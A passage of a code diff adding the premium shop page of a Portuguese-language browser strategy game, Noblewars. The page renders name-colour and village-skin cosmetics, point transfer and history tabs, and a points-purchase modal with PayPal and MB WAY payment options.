+                <strong><?= __('screens.premium.scroll_red') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/color/name_effect_red.webp' alt='Red Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?>     <?= __('screens.premium.red') ?>
+                <?= __('screens.premium.animated') ?>
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-color-red"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: green; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('color', 'red', 'vermelho')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                <strong><?= __('screens.premium.scroll_blue') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/color/name_effect_blue.webp' alt='Blue Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?>     <?= __('screens.premium.blue') ?>
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-color-blue"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: green; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('color', 'blue', 'azul')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                <strong><?= __('screens.premium.scroll_pink') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/color/name_effect_pink.webp' alt='Pink Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?>     <?= __('screens.premium.pink') ?>
+                <?= __('screens.premium.animated') ?>
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-color-pink"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: green; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('color', 'pink', 'rosa')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                <strong><?= __('screens.premium.scroll_yellow') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/color/name_effect_yellow.webp' alt='Pink Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?>     <?= __('screens.premium.yellow') ?>
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-color-yellow"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: green; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('color', 'yellow', 'amarelo')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                <strong><?= __('screens.premium.scroll_purple') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/color/name_effect_pink.webp' alt='Pink Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?> roxo
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-color-purple"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: green; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('color', 'purple', 'roxo')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+
+        <div class='premium-card'
+            style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+            <div
+                style='background: #8B4513; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                <strong><?= __('screens.premium.scroll_orange') ?></strong>
+            </div>
+            <div style='text-align: center; margin: 20px 0;'>
+                <img src='/graphic/new/premium/name/color/name_effect_orange.webp' alt='Pink Scroll'
+                    style='width: 100px; height: 100px;' />
+            </div>
+            <p><?= __('screens.premium.change_name_color') ?> laranja
+                <?= __('screens.premium.for_this_world') ?><br /><?= __('screens.premium.example') ?> <span
+                    class="username-color-orange"><?= htmlspecialchars($user['username']) ?></span>
+            </p>
+            <div style='text-align: center; margin: 10px 0;'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' /> <strong>100
+                    <?= __('screens.premium.points') ?></strong>
+            </div>
+            <div style='text-align: center;'>
+                <button class='btn' style='background: green; color: white; padding: 8px 20px;'
+                    onclick="buyCosmetic('color', 'orange', 'laranja')"><?= __('screens.premium.acquire') ?></button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Village Skins Section -->
+    <h3
+        style="margin-top: 40px; margin-bottom: 20px; color: #8B4513; border-bottom: 2px solid #8B4513; padding-bottom: 10px;">
+        <?= __('screens.premium.village_appearance') ?>
+    </h3>
+    <p style="margin-bottom: 20px; color: #666;">
+        <?= __('screens.premium.customize_village') ?>
+    </p>
+
+    <div
+        style='display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-bottom: 30px;'>
+        <?php
+        $village_skins = [
+            ['color' => 'blue', 'name' => __('screens.premium.color_blue'), 'bg' => '#4169E1', 'cost' => 150],
+            ['color' => 'red', 'name' => __('screens.premium.color_red'), 'bg' => '#DC143C', 'cost' => 150],
+            ['color' => 'turquoise', 'name' => __('screens.premium.color_turquoise'), 'bg' => '#40E0D0', 'cost' => 150],
+            ['color' => 'yellow', 'name' => __('screens.premium.color_yellow'), 'bg' => '#FFD700', 'cost' => 150],
+            ['color' => 'orange', 'name' => __('screens.premium.color_orange'), 'bg' => '#FF8C00', 'cost' => 150],
+            ['color' => 'pink', 'name' => __('screens.premium.color_pink'), 'bg' => '#FF69B4', 'cost' => 150],
+            ['color' => 'civilian', 'name' => __('screens.premium.color_civilian'), 'bg' => '#8B7355', 'cost' => 200, 'special' => true],
+            ['color' => 'forest', 'name' => __('screens.premium.color_forest'), 'bg' => '#228B22', 'cost' => 200, 'special' => true],
+            ['color' => 'mine', 'name' => __('screens.premium.color_mine'), 'bg' => '#696969', 'cost' => 200, 'special' => true]
+        ];
+
+        foreach ($village_skins as $skin):
+            ?>
+            <div class='premium-card'
+                style='border: 2px solid #8B4513; padding: 15px; background: #F4E4BC; border-radius: 8px;'>
+                <div
+                    style='background: <?= $skin['bg'] ?>; color: white; padding: 8px; text-align: center; border-radius: 5px; margin-bottom: 10px;'>
+                    <strong><?= $skin['name'] ?><?= isset($skin['special']) ? ' ⭐' : '' ?></strong>
+                </div>
+
+                <!-- Preview images -->
+                <div style='text-align: center; margin: 15px 0; background: #2C1810; padding: 15px; border-radius: 5px;'>
+                    <div style='margin-bottom: 10px;'>
+                        <small
+                            style='color: #F4E4BC; display: block; margin-bottom: 5px;'><?= __('screens.premium.day_levels') ?></small>
+                        <?php
+                        $prefix = isset($skin['special']) ? '' : 'banner_';
+                        $skinName = $skin['color'];
+                        ?>
+                        <div style='display: flex; justify-content: center; gap: 5px;'>
+                            <img src='/graphic/map/design/<?= $prefix . $skinName ?>_v1.png' alt='v1'
+                                style='width: 30px; height: 30px;' onerror="this.src='/graphic/map/v1.png'">
+                            <img src='/graphic/map/design/<?= $prefix . $skinName ?>_v2.png' alt='v2'
+                                style='width: 30px; height: 30px;' onerror="this.src='/graphic/map/v2.png'">
+                            <img src='/graphic/map/design/<?= $prefix . $skinName ?>_v3.png' alt='v3'
+                                style='width: 30px; height: 30px;' onerror="this.src='/graphic/map/v3.png'">
+                        </div>
+                    </div>
+                    <div>
+                        <small
+                            style='color: #F4E4BC; display: block; margin-bottom: 5px;'><?= __('screens.premium.night_levels') ?></small>
+                        <div style='display: flex; justify-content: center; gap: 5px;'>
+                            <img src='/graphic/map_dark/design/n_<?= $prefix . $skinName ?>_v1.png' alt='v1'
+                                style='width: 30px; height: 30px;' onerror="this.src='/graphic/map_dark/v1.png'">
+                            <img src='/graphic/map_dark/design/n_<?= $prefix . $skinName ?>_v2.png' alt='v2'
+                                style='width: 30px; height: 30px;' onerror="this.src='/graphic/map_dark/v2.png'">
+                            <img src='/graphic/map_dark/design/n_<?= $prefix . $skinName ?>_v3.png' alt='v3'
+                                style='width: 30px; height: 30px;' onerror="this.src='/graphic/map_dark/v3.png'">
+                        </div>
+                    </div>
+                </div>
+
+                <p style='font-size: 13px; color: #666; margin: 10px 0;'>
+                    <?php if (isset($skin['special'])): ?>
+                        <strong><?= __('screens.premium.special_skin') ?></strong><br>
+                    <?php endif; ?>
+                    <?= __('screens.premium.village_will_appear') ?>
+                </p>
+
+                <div style='text-align: center; margin: 10px 0;'>
+                    <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' />
+                    <strong><?= $skin['cost'] ?>         <?= __('screens.premium.points') ?></strong>
+                </div>
+
+                <div style='text-align: center;'>
+                    <button class='btn'
+                        style='background: <?= $skin['bg'] ?>; color: white; padding: 8px 20px; border: none; border-radius: 4px; cursor: pointer;'
+                        onclick="buyVillageSkin('<?= $skin['color'] ?>', '<?= $skin['name'] ?>', <?= $skin['cost'] ?>)"><?= __('screens.premium.acquire') ?></button>
+                </div>
+            </div>
+        <?php endforeach; ?>
+    </div>
+
+
+<?php elseif ($tab === 'transfer'): ?>
+    <!-- Transfer Tab -->
+    <div class="info-box" style="background: #FFF3CD; border: 1px solid #8a5613; color: #644c05; padding: 15px; border-radius: 5px; margin-bottom: 20px;">
+        <strong>Tenha em atenção que os Pontos Premium só podem ser transferidos para outras contas no Noblewars.</strong>
+    </div>
+
+    <table class='vis' width='100%'>
+        <tr>
+            <th colspan='2'>
+                <img src='/graphic/new/premium/coinbag_15x15.png' style='vertical-align: middle;' />
+                Pontos premium transferíveis: 0
+            </th>
+        </tr>
+        <tr>
+            <td width='150'>Destinatário:</td>
+            <td><input type='text' name='recipient' style='width: 200px;' /></td>
+        </tr>
+        <tr>
+            <td>Pontos Premium:</td>
+            <td>
+                <input type='number' name='points' min='1' style='width: 100px;' />
+                <a href='#'> O que são pontos transferíveis?</a>
+            </td>
+        </tr>
+        <tr>
+            <td colspan='2' style='text-align: center; padding: 10px;'>
+                <button class='btn'>Avançar</button>
+            </td>
+        </tr>
+    </table>
+
+<?php elseif ($tab === 'points_history'): ?>
+    <!-- Points History Tab -->
+    <table class='vis' width='100%'>
+        <tr>
+            <th>Data</th>
+            <th>Mundo</th>
+            <th>Transação</th>
+            <th>Movimento</th>
+            <th>Saldo</th>
+            <th>Descrição</th>
+        </tr>
+        <?php if (empty($points_history)): ?>
+            <tr>
+                <td colspan='6' style='text-align: center; padding: 20px; color: #999;'>
+                    Nenhuma transação registada.
+                </td>
+            </tr>
+        <?php else: ?>
+            <?php foreach ($points_history as $transaction): ?>
+                <tr>
+                    <td><?= date('d.m.Y H:i', strtotime($transaction['created_at'])) ?></td>
+                    <td>Mundo 1</td>
+                    <td>
+                        <?php
+                        $type_labels = [
+                            'purchase' => '💰 Compra',
+                            'spend' => '🛒 Gasto',
+                            'transfer_out' => '📤 Transferência enviada',
+                            'transfer_in' => '📥 Transferência recebida',
+                            'admin' => '⚙️ Ajuste admin'
+                        ];
+                        echo $type_labels[$transaction['transaction_type']] ?? $transaction['transaction_type'];
+                        ?>
+                    </td>
+                    <td style='color: <?= $transaction['amount'] > 0 ? 'green' : 'red' ?>; font-weight: bold;'>
+                        <?= $transaction['amount'] > 0 ? '+' : '' ?>             <?= $transaction['amount'] ?>
+                    </td>
+                    <td><?= $transaction['balance_after'] ?></td>
+                    <td style='font-size: 12px;'><?= htmlspecialchars($transaction['description']) ?></td>
+                </tr>
+            <?php endforeach; ?>
+        <?php endif; ?>
+    </table>
+
+<?php elseif ($tab === 'features_history'): ?>
+    <!-- Features History Tab -->
+    <table class='vis' width='100%'>
+        <tr>
+            <th>Data</th>
+            <th>Mundo</th>
+            <th>Funcionalidade</th>
+            <th>Duração</th>
+            <th>Pontos gastos</th>
+            <th>Estado</th>
+        </tr>
+        <?php if (empty($features_history)): ?>
+            <tr>
+                <td colspan='6' style='text-align: center; padding: 20px; color: #999;'>
+                    Nenhuma funcionalidade ativada.
+                </td>
+            </tr>
+        <?php else: ?>
+            <?php foreach ($features_history as $feature): ?>
+                <tr>
+                    <td><?= date('d.m.Y H:i', strtotime($feature['created_at'])) ?></td>
+                    <td>Mundo 1</td>
+                    <td><?= htmlspecialchars($feature['feature_name']) ?></td>
+                    <td><?= $feature['duration_days'] ?> dias</td>
+                    <td><?= $feature['points_spent'] ?> pontos</td>
+                    <td>
+                        <?php
+                        $now = time();
+                        $expires = strtotime($feature['expires_at']);
+                        if ($expires > $now) {
+                            $days_left = ceil(($expires - $now) / 86400);
+                            echo "<span style='color: green;'>✓ Ativo ($days_left dias)</span>";
+                        } else {
+                            echo "<span style='color: #999;'>⏱ Expirado</span>";
+                        }
+                        ?>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        <?php endif; ?>
+    </table>
+
+<?php endif; ?>
+
+<script>
+    function buyCosmetic(type, value, colorName) {
+        showConfirmModal(type, value, colorName);
+    }
+
+    function buyVillageSkin(color, colorName, cost) {
+        if (!confirm(`Comprar skin de aldeia "${colorName}" por ${cost} pontos premium?\n\nA tua aldeia aparecerá com esta cor no mapa para todos os jogadores.`)) {
+            return;
+        }
+
+        const formData = new FormData();
+        formData.append('action', 'buy_cosmetic');
+        formData.append('type', 'village_skin');
+        formData.append('value', color);
+
+        fetch(window.location.href, {
+            method: 'POST',
+            body: formData
+        })
+            .then(response => {
+                return response.text(); // Get text first to see what's returned
+            })
+            .then(text => {
+                console.log('Response:', text); // Debug: show response
+                const data = JSON.parse(text); // Try to parse JSON
+                if (data.success) {
+                    alert('✅ ' + data.message);
+                    location.reload();
+                } else {
+                    alert('❌ ' + data.message);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Erro ao processar compra: ' + error);
+            });
+    }
+
+    function showConfirmModal(type, value, colorName) {
+        const modal = document.getElementById('cosmeticConfirmModal');
+        const preview = document.getElementById('cosmeticPreview');
+        const description = document.getElementById('cosmeticDescription');
+        const warning = document.getElementById('cosmeticWarning');
+
+        // Set preview with actual effect
+        const className = type === 'animation' ? 'username-animated-' + value : 'username-color-' + value;
+        preview.className = className;
+        preview.textContent = window.currentUsername || 'Username';
+
+        // Set description
+        const typeText = type === 'animation' ? 'animado' : 'estático';
+        description.textContent = `Cosmético: Nome ${typeText} ${colorName}`;
+
+        // For now, always show warning (TODO: check if user has cosmetic)
+        const hasExisting = false;
+
+        if (hasExisting) {
+            warning.style.display = 'block';
+            warning.innerHTML = '<strong>⚠️ Atenção:</strong> Já tens um cosmético deste tipo ativo. Esta compra irá substituir o anterior.';
+        } else {
+            warning.style.display = 'none';
+        }
+
+        // Store purchase data
+        modal.dataset.type = type;
+        modal.dataset.value = value;
+
+        modal.style.display = 'block';
+    }
+
+    function closeConfirmModal() {
+        document.getElementById('cosmeticConfirmModal').style.display = 'none';
+    }
+
+    function confirmPurchase() {
+        const modal = document.getElementById('cosmeticConfirmModal');
+        const type = modal.dataset.type;
+        const value = modal.dataset.value;
+
+        executePurchase(type, value);
+    }
+
+    function executePurchase(type, value) {
+        const formData = new FormData();
+        formData.append('action', 'buy_cosmetic');
+        formData.append('type', type);
+        formData.append('value', value);
+
+        // Get current URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const village = urlParams.get('village');
+        const screen = urlParams.get('screen');
+        const tab = urlParams.get('tab');
+        const h = urlParams.get('h');
+
+        // Build URL with parameters
+        let url = '/game.php?village=' + village + '&screen=' + screen;
+        if (tab) url += '&tab=' + tab;
+        if (h) url += '&h=' + h;
+        url += '&action=buy_cosmetic';
+
+        fetch(url, {
+            method: 'POST',
+            body: formData
+        })
+            .then(response => {
+                console.log('Response status:', response.status);
+                console.log('Response headers:', response.headers);
+                return response.text();
+            })
+            .then(text => {
+                console.log('Response text:', text);
+                try {
+                    const data = JSON.parse(text);
+                    if (data.success) {
+                        closeConfirmModal();
+                        showSuccessModal(data.message, data.new_balance);
+                    } else {
+                        closeConfirmModal();
+                        showErrorModal(data.message);
+                    }
+                } catch (e) {
+                    closeConfirmModal();
+                    showErrorModal('Erro ao processar resposta: ' + e.message);
+                }
+            })
+            .catch(error => {
+                closeConfirmModal();
+                showErrorModal('Erro ao processar compra: ' + error);
+            });
+    }
+
+    function showSuccessModal(message, newBalance) {
+        const modal = document.getElementById('cosmeticResultModal');
+        const title = document.getElementById('resultModalTitle');
+        const content = document.getElementById('resultModalContent');
+
+        title.textContent = 'Compra Realizada!';
+        title.style.color = '#27ae60';
+        content.innerHTML = '<p style="margin: 10px 0;">' + message + '</p>' +
+            '<p style="margin: 10px 0;"><strong>Novo saldo: ' + newBalance + ' pontos premium</strong></p>';
+
+        modal.style.display = 'block';
+    }
+
+    function showErrorModal(message) {
+        const modal = document.getElementById('cosmeticResultModal');
+        const title = document.getElementById('resultModalTitle');
+        const content = document.getElementById('resultModalContent');
+
+        title.textContent = 'Erro';
+        title.style.color = '#e74c3c';
+        content.innerHTML = '<p style="margin: 10px 0;">' + message + '</p>';
+
+        modal.style.display = 'block';
+    }
+
+    function closeResultModal() {
+        document.getElementById('cosmeticResultModal').style.display = 'none';
+        location.reload();
+    }
+</script>
+
+<!-- Cosmetic Purchase Confirmation Modal -->
+<div id="cosmeticConfirmModal"
+    style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 10000;">
+    <div
+        style="position: relative; width: 500px; margin: 100px auto; background: #f4e4bc; border: 3px solid #8b4513; border-radius: 10px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
+        <!-- Close Button -->
+        <button onclick="closeConfirmModal()"
+            style="position: absolute; top: 10px; right: 10px; background: #8b4513; color: white; border: none; width: 30px; height: 30px; border-radius: 50%; cursor: pointer; font-size: 18px; font-weight: bold;">✕</button>
+
+        <!-- Header -->
+        <h3 style="text-align: center; color: #8b4513; margin-bottom: 20px; font-size: 20px;">Confirmar Compra</h3>
+
+        <!-- Preview -->
+        <div
+            style="background: white; border: 2px solid #8b4513; border-radius: 8px; padding: 20px; margin: 20px 0; text-align: center;">
+            <div style="margin-bottom: 10px; color: #666; font-size: 14px;">Pré-visualização:</div>
+            <div id="cosmeticPreview" style="font-size: 24px; font-weight: bold; margin: 10px 0;"></div>
+        </div>
+
+        <!-- Description -->
+        <div style="text-align: center; margin: 15px 0;">
+            <p id="cosmeticDescription" style="color: #333; font-size: 16px; margin: 10px 0;"></p>
+
+            <!-- Warning for replacement -->
+            <div id="cosmeticWarning"
+                style="display: none; background: #fff3cd; border: 2px solid #ffc107; border-radius: 5px; padding: 10px; margin: 15px 0; color: #856404; font-size: 14px;">
+            </div>
+
+            <p style="color: #666; font-size: 14px;">
+                <img src="/graphic/new/premium/coinbag_15x15.png" style="vertical-align: middle;" />
+                <strong>Custo: 100 pontos premium</strong>
+            </p>
+        </div>
+
+        <!-- Buttons -->
+        <div style="display: flex; gap: 10px; justify-content: center; margin-top: 20px;">
+            <button onclick="closeConfirmModal()"
+                style="background: #999; color: white; border: none; padding: 10px 30px; border-radius: 5px; cursor: pointer; font-size: 14px; font-weight: bold;">Cancelar</button>
+            <button onclick="confirmPurchase()"
+                style="background: #27ae60; color: white; border: none; padding: 10px 30px; border-radius: 5px; cursor: pointer; font-size: 14px; font-weight: bold;">Confirmar
+                Compra</button>
+        </div>
+    </div>
+</div>
+
+<!-- Modal de Compra Premium -->
+<div id="premiumPurchaseModal" class="premium-modal" style="display: none;">
+    <div class="modal-overlay" onclick="closePremiumModal()"></div>
+    <div class="modal-content-premium">
+        <button class="modal-close-premium" onclick="closePremiumModal()">×</button>
+
+        <div class="modal-header-premium">
+            <img src="/graphic/new/premium/gold_coins.png" alt="Premium"
+                style="width: 60px; height: 60px; margin-right: 15px;">
+            <h2><?= __('screens.premium.modal_title') ?></h2>
+        </div>
+
+        <div class="modal-body-premium">
+            <!-- Pacotes Premium -->
+            <div class="modal-packages-premium">
+                <?php
+                $modal_packages = [
+                    ['base' => 200, 'bonus' => 0, 'total' => 200, 'price' => '3,99', 'popular' => false, 'image' => 'product_01.png'],
+                    ['base' => 500, 'bonus' => 20, 'total' => 600, 'price' => '9,99', 'popular' => false, 'image' => 'product_02.png'],
+                    ['base' => 1000, 'bonus' => 50, 'total' => 1500, 'price' => '19,99', 'popular' => true, 'image' => 'product_03.png'],
+                    ['base' => 2500, 'bonus' => 100, 'total' => 5000, 'price' => '49,99', 'popular' => false, 'image' => 'product_04.png'],
+                    ['base' => 4000, 'bonus' => 112, 'total' => 8500, 'price' => '79,99', 'popular' => false, 'image' => 'product_05.png']
+                ];
+
+                foreach ($modal_packages as $pkg):
+                    ?>
+                    <div class="modal-package-premium <?= $pkg['popular'] ? 'popular' : '' ?>">
+                        <?php if ($pkg['bonus'] > 0): ?>
+                            <div class="modal-package-bonus-premium"><?= $pkg['base'] ?> + <?= $pkg['bonus'] ?>%</div>
+                        <?php endif; ?>
+
+                        <div class="modal-package-points-premium"><?= number_format($pkg['total'], 0, ',', '.') ?></div>
+                        <div class="modal-package-label-premium"><?= __('screens.premium.gold_bags') ?></div>
+
+                        <div class="modal-package-image-premium">
+                            <img src="/graphic/new/premium/<?= $pkg['image'] ?>" alt="Moedas">
+                        </div>
+
+                        <?php if ($pkg['popular']): ?>
+                            <div class="modal-package-badge-premium"><?= __('screens.premium.most_popular') ?></div>
+                        <?php endif; ?>
+
+                        <div class="modal-package-price-premium"><?= $pkg['price'] ?> €</div>
+                    </div>
+                <?php endforeach; ?>
+            </div>
+
+            <!-- Layout em 2 colunas: Decoração (60%) + Payment (40%) -->
+            <div style="display: grid; grid-template-columns: 1.5fr 1fr; gap: 20px; margin-bottom: 25px;">
+                <!-- Imagem decorativa -->
+                <div class="modal-decoration-premium">
+                    <img src="/graphic/index/bg-noble2.jpg" alt="Decoração">
+                </div>
+
+                <!-- Método de Pagamento -->
+                <div class="modal-payment-premium">
+                    <!-- Inline Notification Warning Container -->
+                    <div id="premium-warning-message" style="display:none; color: #ffaa00; font-weight: bold; margin-bottom: 12px; background: rgba(44, 24, 16, 0.95); padding: 10px 15px; border-radius: 5px; border: 1px solid #ffaa00; text-align: left; font-size: 12px; line-height: 1.5; box-sizing: border-box;">
+                        ⚠️ <span id="premium-warning-text"></span>
+                    </div>
+
+                    <label><?= __('screens.premium.how_to_pay') ?></label>
+                    <div class="payment-row-premium">
+                        <div class="payment-select-premium">
+                            <img id="paymentMethodIcon" src="/graphic/new/premium/paypal.png" alt="PayPal"
+                                style="width: 20px; margin-right: 5px;" onerror="this.style.display='none'">
+                            <select id="paymentMethod" onchange="changePaymentMethod(this.value)" style="background: transparent; border: none; color: #F4E4BC; font-weight: bold; cursor: pointer; outline: none; font-size: 13px; width: 100%;">
+                                <option value="paypal" style="background: #2C1810; color: #F4E4BC;">PayPal</option>
+                                <option value="mbway" style="background: #2C1810; color: #F4E4BC;">MB WAY</option>
+                            </select>
+                        </div>
+                        <button class="payment-dropdown-premium" style="font-size: 13px; padding: 12px 15px; width: auto; min-width: 140px; white-space: nowrap;">Pagar com PayPal</button>
+                    </div>
+
+                    <div class="payment-save-premium">
+                        <label>
+                            <input type="checkbox" id="saveAccount">
+                            <span><?= __('screens.premium.save_account') ?></span>
+                        </label>
+                        <button type="button" class="payment-help-premium"
+                            title="Guardar informações de pagamento para compras futuras"
+                            onclick="showSavePaymentHelp(event)">?</button>
+                    </div>
+
+                    <!-- PayPal Buttons appear here after clicking ▼ -->
+                    <div id="paypal-button-container" style="display:none; margin-top: 15px;"></div>
+
+                    <!-- MB WAY Input/Wait Form appear here after selecting MB WAY and clicking checkout -->
+                    <div id="mbway-container" style="display:none; margin-top: 15px; background: rgba(44, 24, 16, 0.95); padding: 15px; border-radius: 6px; border: 1.5px solid #FF69B4; text-align: left; font-size: 13px; line-height: 1.6; max-width: 100%; box-sizing: border-box;">
+                        <!-- Step 1: Input phone number -->
+                        <div id="mbway-step-input">
+                            <div style="font-weight: bold; color: #FF69B4; font-size: 14px; margin-bottom: 10px; display: flex; align-items: center; gap: 8px;">
+                                <img src="/graphic/new/premium/mbway.png" style="width: 20px; height: auto;" alt="MB WAY">
+                                Pagar com MB WAY
+                            </div>
+                            <p style="margin: 0 0 10px 0; color: #F4E4BC;">Insere o teu número de telemóvel associado ao MB WAY para iniciar o pagamento:</p>
+                            <div style="display: flex; gap: 10px; align-items: center; margin-bottom: 10px;">
+                                <span style="color: #F4E4BC; font-weight: bold;">+351</span>
+                                <input type="text" id="mbway-phone" maxlength="9" placeholder="9xxxxxxxx" style="background: rgba(0,0,0,0.3); border: 1px solid #8B4513; padding: 8px; color: #F4E4BC; font-size: 14px; border-radius: 4px; width: 120px; font-family: monospace; outline: none; text-align: center;">
+                                <button type="button" onclick="startMbwayPayment()" class="payment-dropdown-premium" style="background: #FF69B4; color: #fff; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 13px; transition: 0.3s; margin: 0; display: inline-block;">Pagar</button>
+                            </div>
+                            <div id="mbway-input-error" style="color: #ff4d4d; font-weight: bold; display: none; margin-top: 5px;"></div>
+                        </div>
+
+                        <!-- Step 2: Waiting screen -->
+                        <div id="mbway-step-waiting" style="display: none; text-align: center; padding: 10px 0;">
+                            <div style="font-weight: bold; color: #FF69B4; font-size: 14px; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 8px;">
+                                <img src="/graphic/new/premium/mbway.png" style="width: 20px; height: auto;" alt="MB WAY">
+                                A aguardar MB WAY...
+                            </div>
+                            <div style="margin: 15px 0;">
+                                <!-- Elegant Loader -->
+                                <div class="mbway-spinner" style="width: 30px; height: 30px; border: 3px solid rgba(255,105,180,0.1); border-left-color: #FF69B4; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+                            </div>
+                            <p style="margin: 10px 0; color: #F4E4BC; font-size: 13px;">
+                                Enviámos uma notificação para o telemóvel <strong id="mbway-waiting-phone" style="color: #FF69B4;">9xxxxxxxx</strong>.<br>
+                                Abre a aplicação MB WAY e autoriza o pagamento de <strong id="mbway-waiting-amount" style="color: #FF69B4;">0.00 €</strong>.
+                            </p>
+                            <div style="margin-top: 20px; display: flex; justify-content: center; gap: 10px;">
+                                <button type="button" onclick="cancelMbwayPayment()" class="payment-dropdown-premium" style="background: #B22222; color: #fff; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 13px; transition: 0.3s; margin: 0; display: inline-block;">Cancelar</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Links legais -->
+        <div class="modal-footer-premium">
+            <a href="game.php?village=<?= $village['id'] ?>&screen=support"><?= __('screens.premium.support_request') ?></a>
+            <span>|</span>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=terms"><?= __('screens.premium.general_terms') ?></a>
+            <span>|</span>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=privacy"><?= __('screens.premium.data_protection') ?></a>
+            <span>|</span>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=legal"><?= __('screens.premium.legal_info') ?></a>
+            <p class="footer-note-premium"><?= __('screens.premium.prices_include_tax') ?></p>
+        </div>
+    </div>
+</div>
+</div>
+
+<style>
+    .premium-modal {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 10000;
+        display: flex;
+        align-items: flex-start;
+        justify-content: center;
+        padding-top: 40px;
+        box-sizing: border-box;
+    }
+
+    .modal-overlay {
+        position: absolute;
+        top: 0;
+        left: 0;
